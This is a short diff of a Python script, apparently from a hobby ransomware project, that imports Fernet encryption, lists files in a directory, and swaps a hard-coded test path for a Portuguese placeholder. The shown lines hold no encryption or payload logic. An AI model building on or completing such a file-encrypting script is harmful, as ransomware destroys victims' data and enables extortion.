@@ -1,7 +1,7 @@
 import os
 from cryptography.fernet import Fernet
 
-diretorio = r"D:\Desktop\Ransomware\Teste"  # Prefixo 'r' para indicar uma "string bruta"
+diretorio = r"insira aqui o seu diretorio para teste"  # Prefixo 'r' para indicar uma "string bruta"
 files = []
 
 for file in os.listdir(diretorio):
